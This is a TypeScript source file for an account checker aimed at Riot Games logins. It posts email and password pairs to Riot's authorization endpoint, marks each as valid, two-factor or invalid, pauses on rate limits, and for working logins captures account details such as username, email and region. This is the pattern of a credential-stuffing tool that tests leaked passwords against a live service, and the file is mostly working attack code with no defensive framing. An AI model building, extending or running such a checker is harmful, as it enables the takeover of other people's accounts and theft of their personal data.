import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class RiotChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Riot authentication endpoint
      const authResponse = await this.client.post(
        'https://auth.riotgames.com/api/v1/authorization',
        {
          client_id: 'play-valorant-web-prod',
          nonce: '1',
          redirect_uri: 'https://playvalorant.com/opt_in',
          response_type: 'token id_token',
          scope: 'account openid',
        }
      );

      // Login attempt
      const loginResponse = await this.client.put(
        'https://auth.riotgames.com/api/v1/authorization',
        {
          type: 'auth',
          username: email,
          password: password,
          remember: true,
        }
      );

      if (loginResponse.data?.type === 'response') {
        // Get account details
        const capture = await this.getAccountDetails(loginResponse.data);
        
        return this.createResult(email, password, 'riot', 'valid', capture);
      }

      if (loginResponse.data?.type === 'multifactor') {
        return this.createResult(email, password, 'riot', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(email, password, 'riot', 'invalid');
    } catch (error: any) {
      if (error.response?.status === 429) {
        await this.sleep(5000); // Rate limited, wait 5 seconds
      }
      
      return this.createResult(
        email,
        password,
        'riot',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(authData: any) {
    try {
      // Get Valorant/LoL account info
      const response = await this.client.get(
        'https://account.riotgames.com/api/account/v1/user',
        {
          headers: {
            Authorization: `Bearer ${authData.access_token}`,
          },
        }
      );

      return {
        username: response.data?.username,
        email: response.data?.email,
        emailVerified: response.data?.email_verified,
        region: response.data?.region,
        createdDate: response.data?.created_at,
      };
    } catch {
      return {};
    }
  }
}
